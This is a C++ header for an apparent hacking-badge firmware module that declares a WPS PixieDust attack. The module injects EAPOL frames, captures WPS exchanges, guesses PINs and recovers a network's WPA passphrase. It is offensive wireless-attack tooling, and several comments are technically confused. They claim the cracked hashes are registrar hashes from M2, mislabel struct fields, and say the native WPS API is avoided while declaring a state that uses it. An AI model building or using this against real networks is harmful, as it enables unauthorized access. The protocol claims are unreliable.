// WpsAttack.h – WPS PixieDust attack for ESP32-C5 Pwnterrey Badge
//
// C5-compatible implementation: NO esp_wifi_wps_enable() (crashes ROM).
//
// STRATEGY:
//   Attempt 1: Raw EAPOL injection via promiscuous + 80211_tx (DATA frames)
//     → WSC M1 → capture M2 R-Hash1/R-Hash2 → PixieDust
//   Attempt 2: Passive capture of WPS exchanges from other clients
//   Attempt 3: PIN candidate list (BSSID-derived)
//
#pragma once
#ifndef WpsAttack_h
#define WpsAttack_h

#include <Arduino.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <vector>
#include <esp_wifi.h>
#include <esp_event.h>
#include "esp_wps.h"
#include "EvilPortal.h"       // AccessPoint struct
#include "WpsCrypto.h"
#include "WpsPixieDust.h"
#include "WpsPinGen.h"

// ── Attack modes ──────────────────────────────────────────────────────────────
#define WPS_ATTACK_MODE_FULL    0  // Try all: active → passive → PIN list
#define WPS_ATTACK_MODE_PIXIE   1  // PixieDust only (active + passive)
#define WPS_ATTACK_MODE_PASSIVE 2  // Passive capture only

// ── Attack states ─────────────────────────────────────────────────────────────
#define WPS_STATE_IDLE          0
#define WPS_STATE_CONNECTING    1   // Waiting for open-auth assoc (unused in A1)
#define WPS_STATE_EAPOL_START   2   // EAPOL-Start sent, waiting EAP-Request/Identity
#define WPS_STATE_EAP_IDENTITY  3   // Identity-Response sent, waiting WSC-Start
#define WPS_STATE_M1_SENT       4   // M1 sent, waiting M2
#define WPS_STATE_M3_WAIT       5   // (unused — no longer needed in this impl)
#define WPS_STATE_PIXIE_RUNNING 6   // PixieDust in progress
#define WPS_STATE_PASSIVE_SCAN  7   // Passive capture waiting
#define WPS_STATE_PASSIVE_PIXIE 8   // Passive: running PixieDust
#define WPS_STATE_PIN_FOUND     9   // SUCCESS
#define WPS_STATE_FAILED        10  // All attempts exhausted
#define WPS_STATE_NATIVE_WPS    11  // Native WPS API (esp_wifi_wps_enable) in progress

// ── WPS result codes ──────────────────────────────────────────────────────────
#define WPS_RESULT_PENDING    0
#define WPS_RESULT_CONNECTED  1
#define WPS_RESULT_FAILED     2

// ── Timeouts ──────────────────────────────────────────────────────────────────
#define WPS_CONNECT_TIMEOUT_MS  8000     // 8s open-auth connect
#define WPS_EAPOL_TIMEOUT_MS    5000     // 5s per EAP step
#define WPS_PASSIVE_TIMEOUT_MS  120000   // 2 min passive capture
#define WPS_NATIVE_TIMEOUT_MS   60000    // 60s native WPS API wait

// ── EAPOL types ───────────────────────────────────────────────────────────────
#define EAPOL_TYPE_PACKET   0
#define EAPOL_TYPE_START    1

// ── EAP codes ────────────────────────────────────────────────────────────────
#define EAP_CODE_REQUEST    1
#define EAP_CODE_RESPONSE   2
#define EAP_CODE_SUCCESS    3
#define EAP_CODE_FAILURE    4

// ── EAP types ────────────────────────────────────────────────────────────────
#define EAP_TYPE_IDENTITY   1
#define EAP_TYPE_EXPANDED   254

// ── WPS TLV attribute IDs ────────────────────────────────────────────────────
// (all big-endian, 2-byte type + 2-byte length + value)
#define WPS_ATTR_VERSION           0x104A
#define WPS_ATTR_MSG_TYPE          0x1022
#define WPS_ATTR_UUID_E            0x1047
#define WPS_ATTR_PUBLIC_KEY        0x1032
#define WPS_ATTR_AUTH_TYPE_FLAGS   0x1004
#define WPS_ATTR_ENCR_TYPE_FLAGS   0x1010
#define WPS_ATTR_CONN_TYPE_FLAGS   0x100D
#define WPS_ATTR_CONFIG_METHODS    0x1008
#define WPS_ATTR_WPS_STATE         0x1044
#define WPS_ATTR_MANUFACTURER      0x1021
#define WPS_ATTR_MODEL_NAME        0x1023
#define WPS_ATTR_MODEL_NUMBER      0x1024
#define WPS_ATTR_SERIAL_NUMBER     0x1042
#define WPS_ATTR_PRIMARY_DEV_TYPE  0x1054
#define WPS_ATTR_DEVICE_NAME       0x1011
#define WPS_ATTR_RF_BANDS          0x103C
#define WPS_ATTR_ASSOC_STATE       0x1002
#define WPS_ATTR_DEVICE_PASSWD_ID  0x100F
#define WPS_ATTR_CONFIG_ERROR      0x1009
#define WPS_ATTR_OS_VERSION        0x102D
#define WPS_ATTR_ENROLLEE_NONCE    0x101A  // E-Nonce (from M1)
#define WPS_ATTR_REGISTRAR_NONCE   0x1039  // R-Nonce (from M2)
// CRITICAL: These are the hashes PixieDust cracks — in M2 from AP!
#define WPS_ATTR_R_HASH1           0x103D  // Registrar Hash 1 (in M2)
#define WPS_ATTR_R_HASH2           0x103E  // Registrar Hash 2 (in M2)
// E-Hash: from M3 (enrollee's hashes, NOT what we crack)
#define WPS_ATTR_E_HASH1           0x1014
#define WPS_ATTR_E_HASH2           0x1015

// ── WPS message types ─────────────────────────────────────────────────────────
#define WPS_MSG_M1   0x04
#define WPS_MSG_M2   0x05
#define WPS_MSG_M3   0x07
#define WPS_MSG_M4   0x08
#define WPS_MSG_M5   0x09
#define WPS_MSG_M6   0x0A
#define WPS_MSG_M7   0x0B
#define WPS_MSG_M8   0x0C

// ── WFA Vendor ID (OUI for WPS) ───────────────────────────────────────────────
static const uint8_t WPS_VENDOR_ID[3] = {0x00, 0x37, 0x2A};

// ── WPS capture data ──────────────────────────────────────────────────────────
struct WpsCapture {
    bool    has_m1;        // M1 data ready
    bool    has_m2;        // M2 data ready
    bool    has_m3;        // R-Hash1/R-Hash2 ready (from M2 or passive)
    uint8_t pke[192];      // Enrollee public key (we generate in active mode)
    uint8_t pkr[192];      // Registrar public key (from M2)
    uint8_t e_nonce[16];   // E-Nonce (we generate in active mode)
    uint8_t r_nonce[16];   // R-Nonce (from M2)
    // These fields hold R-Hash1/R-Hash2 from M2 (despite "e_" naming):
    uint8_t e_hash1[32];   // R-Hash1 from M2 (what PixieDust cracks)
    uint8_t e_hash2[32];   // R-Hash2 from M2
    uint8_t auth_key[32];  // AuthKey (derived via DH in active, zeros in passive)
    uint8_t sta_mac[6];    // Enrollee MAC
    uint8_t ap_mac[6];     // AP BSSID
};

// ════════════════════════════════════════════════════════════════════════════
// WpsAttack class
// ════════════════════════════════════════════════════════════════════════════
class WpsAttack {
public:
    // Public for access from WiFiScan main loop
    static WpsAttack *instance;
    char             _foundPin[9];           // null-terminated 8-char PIN
    char             _foundPassphrase[65];   // recovered WPA passphrase
    char             _foundSSID[33];         // AP SSID

    WpsAttack();
    ~WpsAttack();

    void begin(const AccessPoint &ap, uint8_t mode = WPS_ATTACK_MODE_FULL);
    void loop(uint32_t currentTime);
    void stop();

    uint8_t getState()    const { return _state; }
    bool    isFinished()  const { return _state == WPS_STATE_PIN_FOUND ||
                                         _state == WPS_STATE_FAILED; }
    String  getStatusMsg()const { return _statusMsg; }

    // Called from WiFiScan::wpsSnifferCallback
    void handleEapolFrame(const uint8_t *payload, int len, const uint8_t *src_mac);
    void handleMgmtFrame (const uint8_t *payload, int len);

    // TLV helpers (public so caller can use them)
    static int           tlvAppend  (uint8_t *buf, int pos, uint16_t type,
                                     const uint8_t *val, uint16_t len);
    static int           tlvAppend16(uint8_t *buf, int pos, uint16_t type, uint16_t val);
    static int           tlvAppend8 (uint8_t *buf, int pos, uint16_t type, uint8_t  val);
    static const uint8_t*tlvFind    (const uint8_t *buf, int buflen,
                                     uint16_t type, uint16_t &out_len);

    // WiFi event (static — registered via esp_event API)
    static void wifiEventHandler(void* arg, esp_event_base_t event_base,
                                  int32_t event_id, void* event_data);
    static volatile bool _sta_connected;
    static volatile bool _sta_disconnected;
    static volatile int  _wpsResult;
    static char          _s_passphrase[65];
    static char          _s_ssid[33];

    // Native WPS API events (static — registered separately for WPS_ER events)
    static void nativeWpsEventHandler(void* arg, esp_event_base_t event_base,
                                       int32_t event_id, void* event_data);
    static volatile bool _nwps_success;
    static volatile bool _nwps_failed;
    static volatile bool _nwps_timeout;
    static char          _nwps_ssid[33];
    static char          _nwps_passphrase[65];

private:
    uint8_t      _state;
    uint8_t      _mode;
    uint8_t      _attempt;        // 1=active, 2=passive, 3=pin-list
    uint32_t     _stateTimestamp;
    AccessPoint  _ap;
    WpsCrypto    _crypto;
    WpsPixieDust _pixie;
    WpsCapture   _capture;
    std::vector<String> _pins;    // PIN candidates from WpsPinGen
    int          _pinIdx;
    uint8_t      _our_mac[6];
    uint8_t      _our_ip[4];
    String       _statusMsg;

    // TX buffer for 802.11 frames
    uint8_t _tx_buf[700];
    int     _tx_len;
    uint8_t _eap_id;
    uint8_t _eap_seq;

    // WiFi event handler registration
    esp_event_handler_instance_t _wifi_event_instance = nullptr;

    // Native WPS event handler registration
    esp_event_handler_instance_t _nwps_event_instance = nullptr;

    void setState(uint8_t s, const char *msg = nullptr);

    // ── Native WPS API test ─────────────────────────────────────────────────
    void _nativeWpsCleanup();
    void _nativeWpsLoop(uint32_t now);

    // ── Attempt 1 (EAPOL injection, now Attempt 1B) ─────────────────────────
    void _startAttempt1_eapol();
    void _startAttempt1();
    void _attempt1Loop(uint32_t now);
    void _sendEapolStart();
    void _sendEapIdentityResponse(uint8_t eap_id);
    void _buildAndSendM1(uint8_t eap_id);
    void _processM2(const uint8_t *wsc_tlvs, int tlv_len, uint8_t eap_id);
    void _processM3(const uint8_t *wsc_tlvs, int tlv_len);

    // ── Attempt 2 ──────────────────────────────────────────────────────────
    void _startPassiveCapture();
    void _passiveLoop(uint32_t now);
    bool _parseWscFrame(const uint8_t *eap_frame, int frame_len,
                        const uint8_t *src_mac, const uint8_t *dst_mac);

    // ── Attempt 3 ──────────────────────────────────────────────────────────
    void _reportPinCandidates();

    // ── PixieDust ──────────────────────────────────────────────────────────
    void _runPixieDust();

    // ── Frame builders ─────────────────────────────────────────────────────
    int _buildEapolStartFrame(uint8_t *buf, const uint8_t *dst,
                               const uint8_t *src, const uint8_t *bssid);
    int _buildEapResponseFrame(uint8_t *buf, const uint8_t *dst,
                                const uint8_t *src, const uint8_t *bssid,
                                uint8_t eap_id,
                                const uint8_t *eap_body, int eap_body_len);
};

#endif // WpsAttack_h
